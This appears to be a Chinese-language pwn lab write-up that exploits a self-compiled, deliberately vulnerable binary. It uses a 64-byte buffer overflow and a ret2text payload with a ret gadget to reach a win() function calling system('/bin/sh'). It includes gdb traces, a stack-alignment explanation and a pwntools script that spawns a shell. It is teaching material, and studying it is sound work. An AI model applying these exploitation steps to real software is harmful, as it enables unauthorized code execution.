# M3 · 01 — 栈溢出：ret2text 与"64 位栈对齐"实战

> 目标程序：`vuln`（自编译，`-O0 -no-pie -fno-stack-protector -z execstack`）
> 利用链：ret2text（`pad72 + ret + win`）
> 核心踩坑：**ret2text 也会因为栈对齐而 SIGSEGV**，gdb 抓到崩点在 `do_system+363: movaps`
> 报告日期：2026-09-24

---

## 1. 范围（Scope）

| 项 | 内容 |
|---|---|
| 样本 | 本仓库 `vuln.c` 自编译教学靶机，非第三方样本 |
| 指纹 | md5 `9ed626703a9154cefc397c789394ddb7`（`evidence/00-file-checksec.txt`）|
| 缓解措施 | No PIE（`0x400000`）、No canary、**NX 关闭**（`GNU_STACK` 缺失 + RWX 段，见下）|
| 技术目标 | ① 定位无界读 ② cyclic 定偏移 ③ ret2text 拿 shell ④ 说清"为何裸跳 win 会崩、垫 ret 就能过" |

`evidence/00-file-checksec.txt` 的 checksec 结果：
```
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

---

## 2. 证据（Evidence）

### 2.1 漏洞点 — Ghidra 反编译
`evidence/ghidra-decomp.c`：
```c
void vuln(void)
{
  undefined1 local_48 [64];        // 64 字节栈缓冲
  printf("input> ");
  fflush(stdout);
  read(0,local_48,0x100);          // 却一次读 256 字节！
  printf("you said: %s\n",local_48);
}
```

Ghidra 自己就把矛盾摆在同一屏：缓冲区 `[64]`，读入长度 `0x100`，溢出 **192 字节**。

### 2.2 漏洞点 — objdump 反汇编（二次确认）
`evidence/04-vuln-disasm.txt`：
```
40123d: lea    rax,[rbp-0x40]      ; buf = rbp-0x40，即 64 字节
401241: mov    edx,0x100           ; count = 256
401249: call   4010c0 <read@plt>   ; read(0, buf, 256)
...
40126f: leave
401270: ret                        ; 无边界检查，直接返回
```

### 2.3 编译期证据 — gcc 自己报出来
`bash build.sh` 时 gcc 13.3.0 主动告警（未阻断编译）：
```
vuln.c:25:5: warning: 'read' writing 256 bytes into a region of size 64
                      overflows the destination [-Wstringop-overflow=]
vuln.c:21:10: note: destination object 'buf' of size 64
```
> 这条很重要：漏洞不是"事后才发现"的，编译器早就警告了。真实代码审计中，`-Wstringop-overflow` 是免费的栈溢出探针。

### 2.4 偏移测定 — cyclic + gdb
`evidence/cyclic-offset.txt`。用 `cyclic(200, n=8)` 喂入，gdb 断在 `vuln` 的 `leave`（`0x40126f`，此时 rbp 尚未被污染）：

```
rbp          = 0x7fffffffdf90
buf 地址      = rbp-0x40 = 0x7fffffffdf50
saved rbp 槽  = rbp      = 0x7fffffffdf90
返回地址槽    = rbp+8    = 0x7fffffffdf98

0x7fffffffdf50: 0x6161616161616161  0x6161616161616162
0x7fffffffdf60: 0x6161616161616163  0x6161616161616164
0x7fffffffdf70: 0x6161616161616165  0x6161616161616166
0x7fffffffdf80: 0x6161616161616167  0x6161616161616168
0x7fffffffdf90: 0x6161616161616169  0x616161616161616a   <- rbp+8 = 返回地址槽
```

`0x616161616161616a` 小端即 `b'jaaaaaaa'`，pwntools `cyclic_find(b'jaaaaaaa', n=8) = 72`。

> **结论：OFFSET = 72 = `buf[64]` + `saved rbp[8]`。**
> 这也解释了 Ghidra 里的 `local_48[64]`：sub rsp,0x40 给 64 字节，但栈帧里保存 rbp 又占 8，所以从 buf 起点到返回地址共 72 字节。

### 2.5 关键地址（No-PIE，固定不变）
`evidence/01-nm-symbols.txt` + `evidence/03-gadgets.txt`：
```
0000000000401271 T main
000000000040120e T vuln
00000000004011d6 T win
0x000000000040101a : ret          <- 唯一的裸 ret gadget（全量 77 条 gadget 中筛选）
```

`win` 内容（`evidence/ghidra-decomp.c`）：
```c
void win(void) { puts("[*] win() reached"); fflush(stdout); system("/bin/sh"); }
```

### 2.6 利用执行
`evidence/exp-ret2text-run.log`：
```
[*] payload = 88 bytes: pad72 + ret + win
you said: AAAA...(72A)...
[*] win() reached
uid=1001(lzq) gid=1002(lzq) groups=1002(lzq),27(sudo)
===RET2TEXT_SHELL_WORKS===
```

---

## 3. 核心踩坑：栈不对齐导致 ret2text 崩在 movaps

### 3.1 现象
朴素的利用 payload 是 `pad72 + win`。实测**拿不到 shell**，程序静默退出。

`evidence/align-experiment.log` 做了对照实验（只改 ret 垫片个数）：

| payload | 结果 |
|---|---|
| `pad72 + win`（0 个 ret） | **NO SHELL（timeout）** |
| `pad72 + ret + win`（1 个 ret） | **GOT SHELL → `===DONE===`** |
| `pad72 + ret + ret + win`（2 个 ret） | **NO SHELL（timeout）** |

**只有恰好 1 个 ret 能通**，0 个和 2 个都崩——这一条就把"玄学垫 ret"钉死成了可量化的数学模型。

### 3.2 根因 — gdb 直接抓到崩溃指令
`evidence/gdb-alignment-proof.txt`，`pad72 + win` 单独跑：

```
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c5843b in do_system (line=0x402016 "/bin/sh") at ../sysdeps/posix/system.c:148
rip            0x7ffff7c5843b      0x7ffff7c5843b <do_system+363>
rsp            0x7fffffffdbf8      0x7fffffffdbf8
=> 0x00007ffff7c5843b <do_system+363>:  movaps XMMWORD PTR [rsp+0x50],xmm0
   0x00007ffff7c58440 <do_system+368>: call   0x7ffff7d0edd0 <__GI___posix_spawn>
#0  0x00007ffff7c5843b in do_system (line=0x402016 "/bin/sh") ...
#1  0x000000000040120b in win ()
```

同文件里 `pad72 + ret + win` 的结果：
```
process 189 is executing new program: /usr/bin/dash
```

### 3.3 机理
- SysV AMD64 ABI 要求：**执行 `call` 的那一刻 `rsp` 必须 16 字节对齐**，于是被调函数入口处 `rsp ≡ 8 (mod 16)`；函数经 `push rbp` 后 `rsp ≡ 0 (mod 16)`，这才满足 `movaps` 对 16 字节对齐内存的要求（glibc 2.39 的 `do_system` 在 `../sysdeps/posix/system.c:148` 用了 SSE 保存寄存器）。
- `vuln` 的收尾是 `leave; ret`。`leave` 把 `rsp` 设为旧 `rbp`，`pop rbp` 后 `rsp = 旧rbp + 8`；随后 `ret` 弹出 `win` 地址，`rsp` 再 +8。**落在 `win` 入口时 `rsp ≡ 0 (mod 16)`，比 ABI 要求的 `≡ 8` 差了 8 字节**，`win` 内再经若干 call/push 后，`do_system` 里 `movaps [rsp+0x50]` 的地址不再 16 字节对齐 → `#GP` → SIGSEGV。
- 在 payload 里插入一个裸 `ret`（`0x40101a`），相当于多弹一次，把 `rsp` 推 +8，`win` 入口恢复为 `rsp ≡ 8 (mod 16)`，`movaps` 对齐，`system` 正常执行。

> **这就是 Writeup #4 的核心素材**：栈对齐不是 Pwn 题的"可选优化"，而是能不能跑通的硬门槛；而且它不是"多加几个 ret 总没错"——加 1 个对，加 2 个反而崩，因为对齐是按 16 取模的，多一个就翻错方向。

---

## 4. 结论（Conclusion）

| # | 结论 | 证据 |
|---|---|---|
| C1 | 漏洞根因是 `read(0, buf, 256)` 写入 `char buf[64]`，溢出 192 字节 | 2.1 Ghidra / 2.2 objdump / 2.3 gcc 告警（三方独立） |
| C2 | 溢出偏移 `OFFSET = 72` = `buf[64] + saved rbp[8]` | 2.4 cyclic + gdb 实测定位 |
| C3 | No-PIE + 无 canary + NX 关，可用 ret2text 直接控 `rip` | 2.5 checksec + nm |
| C4 | `win()` 内含 `system("/bin/sh")`，是天然的后门函数 | 2.5 Ghidra 反编译 |
| C5 | 裸跳 `win` 会 SIGSEGV，必须垫 1 个裸 `ret`（`0x40101a`）做 16 字节栈对齐；垫 0 个或 2 个均失败 | 3.1 对照实验 + 3.2 gdb 崩点 `movaps` |
| C6 | 最终 payload = `b"A"*72 + p64(0x40101a) + p64(0x4011d6)`，88 字节，拿到 `uid=1001(lzq)` shell | 2.6 运行日志 |

---

## 5. 复现（Reproduction）

```bash
cd practice/pwn-practice/01-stack-overflow
bash build.sh                                  # 编译（会看到 -Wstringop-overflow 告警）
python3 exp_ret2text.py                        # 本地利用，输出 uid=1001(lzq)
```

跑栈对齐对照实验：
```bash
python3 - <<'PY'
from pwn import *
context.binary = ELF("./vuln"); context.log_level = "error"
for n in (0, 1, 2):
    p = process("./vuln")
    p.sendlineafter(b"input> ", b"A"*72 + p64(0x40101a)*n + p64(0x4011d6))
    p.sendline(b"id; echo ===DONE===")
    try:    print(n, "SHELL:", p.recvuntil(b"===DONE===", timeout=5)[-30:])
    except Exception: print(n, "CRASH")
    p.close()
PY
```

---

## 6. 文件清单
```
01-stack-overflow/
├── vuln.c / vuln              # 源码 + 编译产物
├── build.sh                   # 编译脚本（含缓解开关）
├── exp_ret2text.py            # 利用脚本（含对齐注释）
├── report.md                  # 本报告
└── evidence/
    ├── 00-file-checksec.txt
    ├── 01-nm-symbols.txt
    ├── 02-objdump-disasm.txt
    ├── 03-gadgets.txt / 03-gadgets-full.txt
    ├── 04-vuln-disasm.txt
    ├── 05-win-disasm.txt
    ├── cyclic-offset.txt      # gdb 断点定偏移全过程
    ├── align-experiment.log   # 垫 0/1/2 个 ret 的对照实验
    ├── gdb-alignment-proof.txt# gdb 抓到 movaps SIGSEGV
    ├── exp-ret2text-run.log
    └── ghidra-decomp.c
```